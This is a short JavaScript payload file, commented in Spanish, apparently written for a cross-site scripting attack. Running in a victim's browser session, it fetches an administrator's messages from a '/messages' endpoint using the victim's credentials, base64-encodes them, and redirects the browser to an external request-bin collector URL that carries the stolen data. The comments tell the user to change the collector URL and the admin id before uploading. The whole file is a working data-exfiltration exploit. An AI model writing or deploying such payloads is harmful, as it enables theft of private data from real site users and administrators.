// payload.js  -- editar la URL del colector antes de subir
(async function(){
  try {
    const adminId = 1; // cambiar si sabes que el admin tiene otro id
    const resp = await fetch('/messages?id=' + adminId, {credentials: 'same-origin'});
    const json = await resp.json();
    const b64 = btoa(unescape(encodeURIComponent(JSON.stringify(json))));
    // Cambia a tu servidor capaz de recibir la petición
    window.location = 'http://requestbin.whapi.cloud/14touqb1?d=' + b64;
  } catch (e) {
    console.log('exploit error', e);
  }
})();
